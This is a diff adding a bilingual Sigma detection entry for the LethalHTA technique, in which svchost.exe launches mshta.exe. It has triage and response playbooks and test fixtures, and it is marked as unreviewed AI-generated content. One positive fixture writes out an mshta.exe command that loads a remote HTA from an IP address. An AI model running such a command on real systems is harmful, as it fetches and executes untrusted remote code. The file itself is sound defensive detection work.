@@ -1,0 +1,136 @@
+{
+  "rule": {
+    "id": "ed5d72a6-f8f4-479d-ba79-02f6a80d7471",
+    "title": "Potential LethalHTA Technique Execution",
+    "level": "high",
+    "status": "test",
+    "author": "Markus Neis",
+    "path": "windows/process_creation/proc_creation_win_mshta_lethalhta_technique.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_mshta_lethalhta_technique.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1218.005"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se creó un proceso mshta.exe cuyo proceso padre es svchost.exe. Esto coincide con la técnica LethalHTA, donde un objeto COM de HTA se activa por DCOM de forma remota para ejecutar código en el host.",
+      "what_it_detects": "Eventos de creación de procesos en Windows donde Image termina en \\mshta.exe y ParentImage termina en \\svchost.exe. Con LethalHTA, el servicio DcomLaunch (svchost.exe) arranca mshta.exe al instanciarse remotamente el objeto COM htafile, que luego carga una HTA desde una URL o ruta UNC.",
+      "why_it_matters": "mshta.exe es un binario firmado de Microsoft que ejecuta VBScript o JScript dentro de archivos HTA. Así se evaden controles de aplicaciones (ATT&CK T1218.005, Mshta). LethalHTA lo usa además para moverse lateralmente por DCOM sin dejar archivos en disco.",
+      "triage_steps": [
+        "Revise el CommandLine de mshta.exe: busque -Embedding, URLs, rutas UNC o scripts inline (vbscript:, javascript:). Registre cualquier dominio o IP que aparezca.",
+        "Revise el ParentCommandLine de svchost.exe: '-k DcomLaunch' indica activación DCOM; '-k netsvcs' o 'Schedule' apunta a una tarea programada.",
+        "En los eventos 4624 tipo 3 del mismo host (±15 minutos), identifique la IP de origen y la cuenta del inicio de sesión remoto que activó DCOM.",
+        "Revise las conexiones de red de mshta.exe (Sysmon 3) y las consultas DNS para encontrar dónde se descargó la HTA.",
+        "Liste los procesos hijos de mshta.exe (powershell.exe, cmd.exe, rundll32.exe) y los archivos o claves de registro que creó.",
+        "Pivote por la IP de origen y la cuenta para encontrar otros hosts con la misma alerta o con actividad DCOM/SMB parecida.",
+        "Si el padre es el servicio Schedule, revise la tarea programada con schtasks o en el evento 4698 y decida si es legítima."
+      ],
+      "false_positives": [
+        "Tareas programadas legítimas que ejecutan archivos HTA; en Windows 10 y versiones posteriores, svchost.exe puede ser el padre directo.",
+        "Software de gestión o instaladores de proveedores que abren interfaces HTA mediante COM/DCOM.",
+        "Pruebas autorizadas de red team o de emulación de adversarios."
+      ],
+      "response_steps": [
+        "Confirme el origen con el CommandLine, el inicio de sesión remoto y la conexión de red antes de actuar.",
+        "Si es malicioso, aísle el endpoint y bloquee en el proxy o firewall la URL o IP que alojaba la HTA.",
+        "Restablezca las credenciales de la cuenta usada en el inicio de sesión remoto e investigue el host de origen.",
+        "Elimine la persistencia que encuentre (tareas, servicios, claves Run) y guarde los artefactos para análisis.",
+        "Restrinja el DCOM remoto y bloquee mshta.exe con WDAC o AppLocker donde no se necesite."
+      ],
+      "severity_rationale": "Es alta porque svchost.exe casi nunca lanza mshta.exe de forma legítima, y este patrón indica ejecución remota por DCOM o persistencia."
+    },
+    "en": {
+      "summary": "mshta.exe was started with svchost.exe as its parent process. This matches the LethalHTA technique, where an HTA COM object is activated remotely over DCOM to run code on the host.",
+      "what_it_detects": "Windows process creation events where Image ends with \\mshta.exe and ParentImage ends with \\svchost.exe. In LethalHTA, the DcomLaunch service (svchost.exe) starts mshta.exe when the htafile COM object is instantiated remotely, and mshta then loads an HTA from a URL or UNC path.",
+      "why_it_matters": "mshta.exe is a signed Microsoft binary that runs VBScript or JScript inside HTA files, which lets attackers bypass application controls (ATT&CK T1218.005, Mshta). LethalHTA also uses it to move laterally over DCOM without writing files to disk.",
+      "triage_steps": [
+        "Review the mshta.exe CommandLine for -Embedding, URLs, UNC paths or inline scripts (vbscript:, javascript:). Note any domain or IP.",
+        "Review the svchost.exe ParentCommandLine: '-k DcomLaunch' means DCOM activation; '-k netsvcs' or 'Schedule' points to a scheduled task.",
+        "Check 4624 type 3 logons on the same host (±15 minutes) to find the source IP and account of the remote session that triggered DCOM.",
+        "Check mshta.exe network connections (Sysmon 3) and DNS queries to find where the HTA was downloaded from.",
+        "List child processes of mshta.exe (powershell.exe, cmd.exe, rundll32.exe) and any files or registry keys it created.",
+        "Pivot on the source IP and account to find other hosts with this alert or similar DCOM/SMB activity.",
+        "If the parent is the Schedule service, inspect the task with schtasks or in event 4698 and confirm whether it is legitimate."
+      ],
+      "false_positives": [
+        "Legitimate scheduled tasks that run HTA files; on Windows 10 and later, svchost.exe can be the direct parent.",
+        "Management software or vendor installers that open HTA interfaces through COM/DCOM.",
+        "Authorized red team or adversary emulation tests."
+      ],
+      "response_steps": [
+        "Confirm the origin from the CommandLine, the remote logon and the network connection before acting.",
+        "If malicious, isolate the endpoint and block the URL or IP that hosted the HTA at the proxy or firewall.",
+        "Reset credentials for the account used in the remote logon and investigate the source host.",
+        "Remove any persistence you find (tasks, services, Run keys) and keep the artifacts for analysis.",
+        "Restrict remote DCOM and block mshta.exe with WDAC or AppLocker where it is not needed."
+      ],
+      "severity_rationale": "High, because svchost.exe almost never starts mshta.exe legitimately, and this pattern points to remote DCOM execution or persistence."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "mshta.exe started by the DcomLaunch svchost through remote activation of the htafile COM object (LethalHTA)",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\mshta.exe",
+          "CommandLine": "C:\\Windows\\System32\\mshta.exe -Embedding",
+          "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+          "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p",
+          "IntegrityLevel": "High"
+        }
+      },
+      {
+        "description": "32-bit mshta.exe started by svchost.exe and loading a remote HTA",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-FILE-02.andes.example.com",
+          "User": "ANDES\\svc_backup",
+          "Image": "C:\\Windows\\SysWOW64\\mshta.exe",
+          "CommandLine": "C:\\Windows\\SysWOW64\\mshta.exe http://203.0.113.45/update.hta",
+          "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+          "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule",
+          "IntegrityLevel": "System"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "User opens a local HTA from Explorer; the parent is not svchost.exe",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\mshta.exe",
+          "CommandLine": "\"C:\\Windows\\System32\\mshta.exe\" \"C:\\Users\\jperez\\Desktop\\inventario.hta\"",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "DcomLaunch svchost starting WmiPrvSE.exe, which is normal; the child is not mshta.exe",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "NT AUTHORITY\\NETWORK SERVICE",
+          "Image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+          "CommandLine": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -Embedding",
+          "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+          "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p",
+          "IntegrityLevel": "System"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
